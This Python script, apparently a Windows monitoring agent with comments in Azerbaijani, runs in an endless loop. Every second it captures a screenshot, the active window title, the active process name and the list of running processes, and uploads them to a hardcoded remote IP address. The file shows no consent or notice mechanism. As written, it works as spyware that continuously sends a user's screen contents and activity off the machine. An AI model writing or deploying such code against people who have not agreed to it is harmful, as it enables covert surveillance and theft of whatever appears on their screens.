import time
import io
import socket
import psutil
import requests
import os
import shutil
from datetime import datetime

# Screenshot support
try:
    from PIL import ImageGrab
except:
    ImageGrab = None
import traceback

import win32gui
import win32process


SERVER_URL = "http://88.222.221.40:5050/upload"
PC_NAME = socket.gethostname()
INTERVAL_SECONDS = 1
SAVE_PATH = "screens"
KEEP_HOURS = 1


# =========================
#  UNIVERSAL SCREENSHOT
# =========================
def take_screenshot():
    """Windows 7 / 8 / 10 / 11 üçün avtomatik doğru modu seçir"""
    try:
        if ImageGrab:
            return ImageGrab.grab()
        else:
            import pyscreenshot as ImageShot

            return ImageShot.grab()

    except Exception:
        # Windows 7 fallback
        try:
            import pyscreenshot as ImageShot

            return ImageShot.grab()
        except:
            print("Screenshot alınmadı:", traceback.format_exc())
            return None


# =========================
#   ACTIVE WINDOW
# =========================
def get_active_window_info():
    try:
        hwnd = win32gui.GetForegroundWindow()
        if hwnd == 0:
            return None, None

        title = win32gui.GetWindowText(hwnd)

        tid, pid = win32process.GetWindowThreadProcessId(hwnd)
        try:
            proc = psutil.Process(pid).name()
        except:
            proc = "UNKNOWN"

        return title, proc
    except:
        return None, None


# =========================
#   PROCESS LIST
# =========================
def get_running_processes():
    names = []
    try:
        for p in psutil.process_iter(["name"]):
            try:
                names.append(p.info["name"])
            except:
                pass
    except:
        pass
    return names


# =========================
#   CLEANUP LOCAL
# =========================
def get_hour_folder():
    now = datetime.now()
    return now.strftime("%Y-%m-%d_%H")


def cleanup_old_screens():
    base = os.path.join(SAVE_PATH, PC_NAME)
    if not os.path.exists(base):
        return

    current_hour = get_hour_folder()

    for folder in os.listdir(base):
        p = os.path.join(base, folder)
        if folder != current_hour:
            try:
                shutil.rmtree(p)
            except:
                pass


# =========================
#   LOCAL SAVE
# =========================
def save_local_screen(img):
    hour_folder = get_hour_folder()
    base_path = os.path.join(SAVE_PATH, PC_NAME, hour_folder)
    os.makedirs(base_path, exist_ok=True)

    filename = datetime.now().strftime("img_%H_%M_%S.jpg")
    img.save(os.path.join(base_path, filename), "JPEG", quality=40)


# =========================
#   SEND
# =========================
def send_screenshot():
    img = take_screenshot()
    if img is None:
        return

    save_local_screen(img)

    buf = io.BytesIO()
    img.save(buf, format="JPEG", quality=40)
    buf.seek(0)

    active_title, active_process = get_active_window_info()
    running = get_running_processes()

    data = {
        "pc_name": PC_NAME,
        "active_window": active_title or "",
        "active_process": active_process or "",
        "process_list": ",".join(running),
    }

    files = {"screenshot": ("screen.jpg", buf, "image/jpeg")}

    try:
        r = requests.post(SERVER_URL, data=data, files=files, timeout=10)
        print("[OK]", r.status_code)
    except Exception as e:
        print("Send error:", e)


# =========================
#   MAIN
# =========================
def main():
    print("Universal Agent started →", PC_NAME)

    last_cleanup = time.time()

    while True:
        send_screenshot()

        if time.time() - last_cleanup > 60:
            cleanup_old_screens()
            last_cleanup = time.time()

        time.sleep(INTERVAL_SECONDS)


if __name__ == "__main__":
    main()
